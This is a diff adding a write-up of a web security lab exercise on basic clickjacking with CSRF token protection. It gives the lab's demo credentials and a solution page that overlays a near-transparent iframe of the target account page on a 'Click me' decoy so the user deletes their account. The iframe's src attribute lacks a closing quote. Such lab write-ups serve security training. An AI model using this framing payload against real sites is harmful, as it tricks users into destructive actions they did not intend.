@@ -1,0 +1,39 @@
+Lab #1 - Basic clickjacking with CSRF token protection
+
+Vulnerability - This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.
+
+Goal - craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.
+
+Credentials - wiener:peter
+
+Solution:
+<!DOCTYPE html>
+<html>
+    <head>
+        <style>
+            #target_website {
+                position: relative;
+                width: 700px;
+                height: 700px;
+                opacity: 0.01;
+                z-index: 2;
+
+            }
+
+            #decoy_website {
+                position: absolute;
+                top:510px;
+                left:60px;
+                z-index: 1;
+            }
+
+        </style>
+    </head>
+
+    <body>
+        <div id="decoy_website">
+            Click me
+        </div>
+        <iframe id="target_website" src="https://0a2200eb049e87fc812b9da0000900ff.web-security-academy.net/my-account></iframe>
+    </body>
+</html>
